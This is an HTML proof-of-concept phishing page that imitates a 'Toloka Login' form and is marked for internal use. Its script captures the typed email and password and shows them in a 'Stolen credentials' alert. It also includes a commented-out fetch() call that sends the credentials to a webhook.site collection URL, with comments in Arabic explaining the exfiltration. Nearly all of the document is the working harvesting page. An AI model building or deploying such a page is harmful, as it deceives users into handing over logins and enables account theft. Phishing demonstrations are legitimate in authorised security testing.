<!DOCTYPE html>
<html>
<head>
  <title>Toloka Login</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f9f9f9;
      margin: 0;
      padding: 40px;
    }
    .login-box {
      background: white;
      border: 1px solid #ccc;
      padding: 30px;
      width: 300px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .login-box h2 {
      text-align: center;
      color: #333;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #2979ff;
      color: white;
      border: none;
      border-radius: 4px;
    }
    .note {
      margin-top: 10px;
      font-size: 0.8em;
      color: gray;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Toloka Login</h2>
    <form onsubmit="handleLogin(event)">
      <input type="email" placeholder="Email" id="email" required />
      <input type="password" placeholder="Password" id="password" required />
      <button type="submit">Log In</button>
    </form>
    <div class="note">For internal use only</div>
  </div>

  <script>
    function handleLogin(e) {
      e.preventDefault();
      const email = document.getElementById("email").value;
      const pass = document.getElementById("password").value;

      // في PoC، فقط نظهر رسالة تنبيه أو نرسل البيانات عبر fetch إلى endpoint وهمي
      alert("Stolen credentials:\nEmail: " + email + "\nPassword: " + pass);

      // أو لإثبات exfiltration:
      /*
      fetch("https://webhook.site/YOUR-UNIQUE-URL", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, pass })
      });
      */
    }
  </script>
</body>
</html>
